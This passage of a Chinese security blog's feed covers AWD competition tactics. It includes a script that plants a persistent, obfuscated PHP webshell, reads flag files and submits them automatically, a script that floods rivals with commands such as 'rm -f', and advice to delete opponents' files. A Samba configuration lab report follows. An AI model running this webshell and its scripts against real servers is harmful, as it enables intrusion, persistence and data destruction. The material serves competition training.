string\">\"PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=\"</span>\npoc <span class=\"token operator\">=</span> <span class=\"token string\">\"fputs(fopen('/var/www/html/nodie.php','w'),base64_decode('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo='));\"</span>\n\nheader2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#提交flag</span>\nurl4<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\npayload3<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"xcu\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat /flag.txt');\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#执行命令</span>\n        url1 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;?a=\"</span><span class=\"token operator\">+</span>poc<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url1)</span>\n        res1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">)</span>\n        url2 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/nodie.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url2)</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">)</span>\n        url3 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/.config1.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url3)</span>\n        res3 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> res3<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(a)</span>\n        <span class=\"token comment\"># 将a存入paylaod2中</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\">#time.sleep(1)</span>\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url4<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>防护常见命令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1 ssh &lt;-p 端口&gt; username@ip\n\n2 scp 文件路径 username@ip:存放路径\n\n3 cat &#x2F;root&#x2F;.bash_history\n\n4 #显示最近登录的5个帐号\n\n5 last -n 5|awk &#39;&#123;print $1&#125;&#39;\n\n6 #显示&#x2F;etc&#x2F;passwd的账户\n\n7 cat &#x2F;etc&#x2F;passwd|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;\n\n8 #查看UID为0的帐号\n\n9 awk -F: &#39;&#123;if($3&#x3D;&#x3D;0)print $1&#125;&#39; &#x2F;etc&#x2F;passwd10 #查找777的权限的文件\n\n11 find . -name &quot;*.php&quot; -perm 4777\n\n12 #查找24小时内被修改的PHP文件\n\n13 find .&#x2F; -mtime 0 -name &quot;*.php&quot;\n\n14 #查看进程\n\n15 ps aux | grep pid或者进程名\n\n16 #查看已建立的网络连接及进程\n\n17 netstat -antulp | grep EST\n\n18 #查看指定端口被哪个进程占用\n\n19 lsof -i:端口号 或者 netstat -tunlp|grep 端口号\n\n20 #结束进程命令\n\n21 kill PID\n\n22 killall &lt;进程名&gt;\n\n23 pkill &lt;进程名&gt;\n\n24 pkill -u用户名\n\n25 #封杀某个IP或者ip段\n\n26 iptables -I INPUT -s source_ip[&#x2F;mask] -j DROP\n\n27 #禁止从某个主机ssh远程访问登陆到本机\n\n28 iptable -t filter -A INPUT -s source_ip[&#x2F;mask] -p tcp --dport 22 -j DROP\n\n29 #备份mysql数据库\n\n30 mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql\n\n31 mysqldump --all-databases &gt; bak.sql\n\n32 #还原mysql数据库\n\n33 mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql\n\n34 #定时任务，在固定的时间间隔执行指定的系统指令或shell script\n\n35 crontab [-u user] file_name\n\n36 crontab [-u user] [-e |-l| -r]\n\n37 #检测所有的tcp连接数量及状态\n\n38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn\n\n39 #查看页面访问排名前十的IP\n\n40 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -\n\n41 #查看页面访问排名前十的URL\n\n42 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>是要做一名合格的搅屎棍</p>\n<p>恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉payload ，此招就是干扰对手利用他人的payload 给对手造成干扰。但是有些比赛可能也会禁止。</p>\n<p>我们拿到shell后在规则允许的情况我们可以删除别人的文件，别人check丢分也相当于自己加分。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">scan_attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'shell.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'index.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'web.php'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1.php'</span><span class=\"token punctuation\">&#125;</span>\n    payload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'cat /flag'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ls -al'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rm -f'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'echo 1'</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8802</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8804</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ii <span class=\"token keyword\">in</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n                url<span class=\"token operator\">=</span><span class=\"token string\">'http://192.168.76.156:'</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/'</span><span class=\"token operator\">+</span>ii\n                <span class=\"token keyword\">for</span> iii <span class=\"token keyword\">in</span> payload<span class=\"token punctuation\">:</span>\n                    data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token string\">'payload'</span><span class=\"token punctuation\">:</span>iii\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                        requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正在搅屎:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>ii<span class=\"token operator\">+</span><span class=\"token string\">'|'</span><span class=\"token operator\">+</span>iii<span class=\"token punctuation\">)</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    scan_attack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最后的最后，准备-漏洞资源-漏洞资料库（比赛能不能联网无法确定，如刚结束的河南省赛，虽然允许联网，但是大部分博客平台被加入了黑名单）</p>\n",
            "tags": [
                "Web",
                "Awd-web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
            "url": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
            "title": "Samba共享",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"实验2：Samba服务器配置\"><a href=\"#实验2：Samba服务器配置\" class=\"headerlink\" title=\"实验2：Samba服务器配置\"></a>实验2：Samba服务器配置</h2><p><strong>实验目的</strong></p>\n<blockquote>\n<p>1、了解Samba协议，理解Samba的工作原理</p>\n<p>3、熟练掌握Samba服务器的配置和故障排除的思路、方法技巧</p>\n<p>4、深入理解Linux的文件权限管理</p>\n<p>4、掌握防火墙Firewall的基本配置</p>\n<p>5、初步学会配置SELinux</p>\n</blockquote>\n<p><strong>实验参考</strong></p>\n<blockquote>\n<p>实验步骤可参考《2-1-Samba服务器配置匿名共享.pdf》文件。</p>\n<p>实验步骤可参考《2-2-Samba服务器配置_安全共享.pdf》文件。</p>\n</blockquote>\n<h3 id=\"1-实验要求\"><a href=\"#1-实验要求\" class=\"headerlink\" title=\"1.实验要求\"></a>1.实验要求</h3><blockquote>\n<p>任务1：配置yum源，使用光盘镜像或者阿里云的YUM源安装Samba服务包。<br>任务2：Samba匿名访问（不需要密码的分享），物理主机匿名访问Samba服务器上的共享目录&#x2F;tmp和&#x2F;share。</p>\n<p>任务3：Samba服务器配置_安全共享。一个小组（公司技术部）共同开发一个项目，所有的项目文件都存放在Samba服务器一个共享目录(&#x2F;home&#x2F;project)。要求：</p>\n<ul>\n<li>公司每位成员使用用户名&#x2F;密码访问Samba共享服务器，但只有技术部的成员可以访问部门的共享目录&#x2F;home&#x2F;project。</li>\n<li>技术部每位成员在共享目录&#x2F;home&#x2F;project新建的文件都属于技术部组。</li>\n<li>技术部每位成员都可以对其他用户建立的文件进行读写操作，但每位用户只能删除自己的文件，不能删除其他用户建立的文件。</li>\n</ul>\n<p>其他要求：</p>\n<p>虚拟机主机名为“Samba-xxx”，其中xxx为自己的姓名拼音简写；测试客户端的主机名修改为“Client-xxx”</p>\n</blockquote>\n<h3 id=\"2-实验过程\"><a href=\"#2-实验过程\" class=\"headerlink\" title=\"2.实验过程\"></a>2.实验过程</h3><h4 id=\"2-1-yum源配置\"><a href=\"#2-1-yum源配置\" class=\"headerlink\" title=\"2.1 yum源配置\"></a>2.1 yum源配置</h4><p>首先将进入到配置目录，将原有的仓库文件进行一个备份</p>\n<p>先创建一个文件夹来存放备份的文件，如下图1-1</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png\" alt=\"image-20221022211307613\" style=\"zoom: 67%;\" />\n\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t图1-1，建立文件夹</p>\n<p>将文件移动进去后，配置一个阿里的yum源，如图1-2</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png\" alt=\"image-20221022212447481\" style=\"zoom: 67%;\" />\n\n<p>​                                                                                 图1-2，yum源配置</p>\n<h4 id=\"2-2-Samba匿名共享\"><a href=\"#2-2-Samba匿名共享\" class=\"headerlink\" title=\"2.2 Samba匿名共享\"></a>2.2 Samba匿名共享</h4><h5 id=\"2-2-1-环境准备\"><a href=\"#2-2-1-环境准备\" class=\"headerlink\" title=\"2.2.1 环境准备\"></a>2.2.1 环境准备</h5><p>应老师要求这里不关闭防火墙和SELinux</p>\n<p>建立一个共享目录&#x2F;public，安装samba服务程序包如图2-1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png\" alt=\"image-20221022213412121\"></p>\n<p>​                                                                                 图2-1，环境准备</p>\n<h5 id=\"2-2-2-修改配置文件-x2F-etc-x2F-samba-x2F-smb-conf\"><a href=\"#2-2-2-修改配置文件-x2F-etc-x2F-samba-x2F-smb-conf\" class=\"headerlink\" title=\"2.2.2 修改配置文件&#x2F;etc&#x2F;samba&#x2F;smb.conf\"></a>2.2.2 修改配置文件&#x2F;etc&#x2F;samba&#x2F;smb.conf</h5><p>进入samba目录，将源文件备份，修改smb.conf文件如图2-2</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png\" alt=\"image-20221022214043968\"></p>\n<p>​                                                                    图2-2，修改配置文件</p>\n<p>修改配置文件内如如下图2-3</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png\" alt=\"image-20221022214220044\"></p>\n<p>​                                                                      图2-3，配置文件内容</p>\n<h5 id=\"2-2-3启动环境\"><a href=\"#2-2-3启动环境\" class=\"headerlink\" title=\"2.2.3启动环境\"></a>2.2.3启动环境</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# testparm #语法检查\n[root@Samba-lq samba]# service nmb start #开启nmb服务\n[root@Samba-lq samba]# service smb start #开启smb服务<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>检查语法如下图2-4</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png\" alt=\"image-20221022214900363\"></p>\n<p>​                                                                          图2-4，语法测试</p>\n<p>开启nmb和smb服务如图2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png\" alt=\"image-20221022214957516\"></p>\n<p>​                                                                          图2-5，开启服务</p>\n<h5 id=\"2-2-4设置防火墙规则和SELinux规则\"><a href=\"#2-2-4设置防火墙规则和SELinux规则\" class=\"headerlink\" title=\"2.2.4设置防火墙规则和SELinux规则\"></a>2.2.4设置防火墙规则和SELinux规则</h5><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# firewall-cmd --permanent --zone&#x3D;public --add-service&#x3D;samba\n[root@Samba-lq samba]# firewall-cmd --reload\n[root@Samba-lq samba]# firewall-cmd --list-services\n[root@Samba-lq samba]# chcon -t samba_share_t &#x2F;public<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>配置如下图2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png\" alt=\"image-20221022221106832\"></p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t图2-5，配置效果图</p>\n<h5 id=\"2-2-5共享目录进入要密码解决\"><a href=\"#2-2-5共享目录进入要密码解决\" class=\"headerlink\" title=\"2.2.5共享目录进入要密码解决\"></a>2.2.5共享目录进入要密码解决</h5><p>问题截图如下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png\" alt=\"image-20221022221620593\"></p>\n<p>这里因为我使用的是老师给的配置文件，发现配置文件在public的配置中没有guest ok允许匿名共享</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png\" alt=\"image-20221022221815533\"></p>\n<p>tmp能够正常访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png\" alt=\"image-20221022221859980\"></p>\n<p>修改后能正常访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png\" alt=\"image-20221022222048533\"></p>\n<h5 id=\"2-2-6共享目录不能正常写入文件\"><a href=\"#2-2-6共享目录不能正常写入文件\" class=\"headerlink\" title=\"2.2.6共享目录不能正常写入文件\"></a>2.2.6共享目录不能正常写入文件</h5><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png\" alt=\"image-20221022222139179\"></p>\n<p>这里是因为public权限问题，这里更改权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png\" alt=\"image-20221022222345913\"></p>\n<p>更改后能够正常访问文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png\" alt=\"image-20221022222414216\"></p>\n<h4 id=\"2-3Samba安全共享\"><a href=\"#2-3Samba安全共享\" class=\"headerlink\" title=\"2.3Samba安全共享\"></a>2.3Samba安全共享</h4><h5 id=\"2-3-1环境准备\"><a href=\"#2-3-1环境准备\" class=\"headerlink\" title=\"2.3.1环境准备\"></a>2.3.1环境准备</h5><p>关闭防火墙和SELinux</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png\" alt=\"image-20221022230620906\"></p>\n<p>创建共享目录并设置权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png\" alt=\"image-20221022230755058\"></p>\n<h5 id=\"2-3-2修改配置文件\"><a href=\"#2-3-2修改配置文件\" class=\"headerlink\" title=\"2.3.2修改配置文件\"></a>2.3.2修改配置文件</h5><p>进入&#x2F;etc&#x2F;samba目录修改smb.conf文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png\" alt=\"image-20221022231259199\"></p>\n<p>重启服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png\" alt=\"image-20221022231355253\"></p>\n<h5 id=\"2-3-3创建共享用户，根据权限访问\"><a href=\"#2-3-3创建共享用户，根据权限访问\" class=\"headerlink\" title=\"2.3.3创建共享用户，根据权限访问\"></a>2.3.3创建共享用户，根据权限访问</h5><p>创建系统用户</p>\n<p><img data-src=\"C:\\Users\\陌路\\AppData\\Roaming\\Typora\\typora-user-images\\image-20221022231649122.png\" alt=\"image-20221022231649122\"></p>\n<p>修改系统用户密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png\" alt=\"image-20221022232021237\"></p>\n<p>创建管理shamab用户（使用pdbedit管理Samba）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png\" alt=\"image-20221022232202251\"></p>\n<p>查看所有的共享用户</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png\" alt=\"image-20221022232421854\"></p>\n<p>2.3.4windows客户端利用账户lisi访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png\" alt=\"image-20221022234754805\"></p>\n<p>创建测试文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png\" alt=\"image-20221022235324326\"></p>\n<p>linu上面用张三登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png\" alt=\"image-20221022235809958\"></p>\n<p>利用账号zhangsan挂载目录到本地</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png\" alt=\"image-20221023000130466\"></p>\n<p>进入挂载目录创建目录文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png\" alt=\"image-20221023000217590\"></p>\n<p>给共享目录设置防删除位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png\" alt=\"image-20221023000438265\"></p>\n<h5 id=\"test-one\"><a href=\"#test-one\" class=\"headerlink\" title=\"test-one\"></a>test-one</h5><p>windows账号lisi删除zhangsan创建的文件失败</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png\" alt=\"image-20221023000515094\"></p>\n<h5 id=\"test-two\"><a href=\"#test-two\" class=\"headerlink\" title=\"test-two\"></a>test-two</h5><p>zhangsan删除lisi用户文件失败</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png\" alt=\"image-20221023000623905\"></p>\n<h3 id=\"3-实验小结\"><a href=\"#3-实验小结\" class=\"headerlink\" title=\"3.实验小结\"></a>3.实验小结</h3>",
            "tags": [
                "Linux",
                "Samba"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
